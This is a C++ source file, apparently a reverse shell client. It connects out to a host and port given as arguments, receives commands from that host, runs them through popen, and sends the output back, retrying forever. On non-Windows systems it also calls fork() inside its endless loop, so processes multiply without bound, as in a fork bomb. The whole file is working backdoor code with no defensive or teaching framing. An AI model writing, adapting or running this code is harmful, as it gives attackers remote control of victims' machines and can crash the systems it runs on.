#include <string>
#include <utility>
#include <valarray>
#include <regex>
#include <list>
#include <thread>
#include <cctype>
#include <sstream>
#include <map>
#include <iostream>

#ifdef _MSC_VER

#include <WinSock2.h>
#include <WS2tcpip.h>
#include <tchar.h>
#include <strsafe.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "User32.lib")

#else

#include <arpa/inet.h>
#include <dirent.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <err.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <csignal>
#include <netdb.h>

#endif


#pragma region Server

#include <cstdio>
#include <string>
#include <functional>

#if (defined _WIN32 || _WIN64)
#define windows
#endif

class Client
{
public:
    using SocketType =
#ifdef windows
        SOCKET;
#else
        int;
#endif

    template <typename T>
    struct Option
    {
        enum class Status { Some, None };
        Status status;
        T value{};
        Option() :status(Status::None) { }
        Option(T value) :status(Status::Some), value(value) { }
        operator Status() { return status; }
        operator T() { return value; }
    };

    using MessageString = const std::string;
    using Result = const Option<const std::string>;

    static const Result::Status Succeeded = Result::Status::None;
    static const Result::Status Failed = Result::Status::Some;

    using ServerResult = Option<const int>;

    static const ServerResult::Status ServerSucceeded = ServerResult::Status::Some;
    static const ServerResult::Status ServerFailed = ServerResult::Status::None;

    const int Port;
    const std::string url;
    SocketType serverSocket{};

    Client(std::string url, const int port) :Port(port), url(std::move(url))
    {
        
    }

    Result Init()
    {
#ifdef windows
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) < 0)
            return { "WinSock init fail" };
#else
        struct sigaction action;
        action.sa_handler = [](int) {};
        sigemptyset(&action.sa_mask);
        action.sa_flags = 0;
        sigaction(SIGPIPE, &action, nullptr);
#endif
        //addrinfo hints{};
        ////ZeroMemory(&hints, sizeof(hints));
        //memset(&hints, 0, sizeof hints);
        //hints.ai_family = AF_UNSPEC;
        //hints.ai_socktype = SOCK_STREAM;
        //hints.ai_protocol = IPPROTO_TCP;
        //if (getaddrinfo(url.c_str(), std::to_string(Port).c_str(), &hints, &addrInfo) != 0)
        //    return { "getaddrinfo error" };
        addrInfo.sin_family = AF_INET;
        addrInfo.sin_port = htons(Port);
        inet_pton(AF_INET, url.c_str(), &addrInfo.sin_addr);
        serverSocket = socket(PF_INET, SOCK_STREAM, 0);
        if (serverSocket <= 0)
            return { "Can't open socket" };
        return {};
    }

    Result Connect()
    {
        if (connect(serverSocket, (sockaddr*)&addrInfo, sizeof addrInfo) == 0)
        {
            return {};
        }
        return { "connect error" };
    }

    ServerResult Recv(char* buf, const uint64_t bufSize)
    {
        int len;
        if ((len = recv(serverSocket, buf, bufSize, 0)) < 0)
        {
            return {};
        }
        return { len };
    }

    ServerResult Send(const char* buf, const uint64_t bufSize)
    {
        int len;
        if ((len = send(serverSocket, buf, bufSize, 0)) < 0)
        {
            return {};
        }
        return { len };
    }

    void SendAll(const std::string& str)
    {
        auto len = str.length();
        for (decltype(len) sent = 0; sent < len; sent += 4096)
        {
            auto toSend = str.substr(sent, 4096);
            Send(toSend.c_str(), toSend.length());
        }
    }

    std::string RecvAll()
    {
        const auto bufSize = 4096;
        char buf[bufSize] = { 0 };
        std::ostringstream oss{};
        while (true)
        {
            const auto res = Recv(buf, bufSize);
            if (res.status == decltype(res)::Status::Some)
            {
                oss.write(buf, res.value);
                if (res.value < bufSize)
                {
                    break;
                }
            }
            else
            {
                break;
            }
        }
        return oss.str();
    }
	
    Result Close() const
    {
#ifdef windows
#define close closesocket
#endif
        close(serverSocket);
        return {};
    }
private:
    //addrinfo* addrInfo{};
    sockaddr_in addrInfo{};
};


#pragma endregion Server

#pragma region Shell

class Shell
{
#if (defined _WIN32 || _WIN64)
#define PipeOpen _popen
#define PipeClose _pclose
#else
#define PipeOpen popen
#define PipeClose pclose
#endif
    FILE* shell = nullptr;
public:
    Shell() = default;

    void Init(const std::string& cmd)
    {
        shell = PipeOpen(cmd.c_str(), "r");
    }

    auto Read(char* buf, int bufSize) const
    {
        return fread(buf, sizeof(char), bufSize, shell);
    }

    std::string ReadAll() const
    {
        std::ostringstream oss{};
        const auto bufSize = 4096;
        char buf[bufSize] = { 0 };
        while (true)
        {
            const auto len = Read(buf, bufSize);
            oss.write(buf, len);
            if (len < bufSize)
            {
                break;
            }
        }
        return oss.str();
    }

    void Write(const char* buf, int bufSize) const
    {
        fwrite(buf, sizeof(char), bufSize, shell);
    }

    void Close() const
    {
        PipeClose(shell);
    }
};

#pragma endregion Shell

void Fuck(Client server)
{
    Shell shell{};
    const auto input = server.RecvAll();
    shell.Init(input);
    //while (true)
    {
        //const auto bufSize = 4096;
        //char buf[bufSize];
        //shell.Read(buf, bufSize);

        const auto echo = shell.ReadAll();
        server.SendAll(echo);
        //puts(echo.c_str());
        server.Close();
    }
}

template<typename In = std::string, typename Out = int>
[[nodiscard]] Out Convert(const In& value)
{
    int res;
    std::istringstream(value) >> res;
    return res;
}

#include <chrono>
#include <thread>

int main(const int argc, char* argv[])
{
    while (true)
    {
#ifndef windows
        fork();
#endif
	    try
	    {
            Client client(argv[1], Convert(std::string(argv[2])));
            client.Init();
            const auto conn = client.Connect();
            if (conn.status == Client::Succeeded)
            {
                Fuck(client);
            }
            std::this_thread::sleep_for(std::chrono::seconds(1));
	    }
	    catch (...)
	    {
	    }
    }
}
